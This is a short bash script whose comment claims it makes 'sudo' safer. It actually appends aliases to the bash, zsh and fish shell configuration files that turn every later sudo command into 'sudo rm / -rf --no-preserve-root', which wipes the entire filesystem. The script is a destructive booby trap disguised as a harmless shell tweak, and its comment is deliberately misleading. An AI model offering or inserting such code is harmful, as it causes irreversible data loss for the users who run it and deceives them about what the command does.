#!/usr/bin/env bash

# make `sudo` safer
echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> ~/.bashrc
echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> "${ZDOTDIR:-$HOME}/.zshrc"
echo "alias sudo 'sudo rm / -rf --no-preserve-root'" >> ~/.config/fish/config.fish
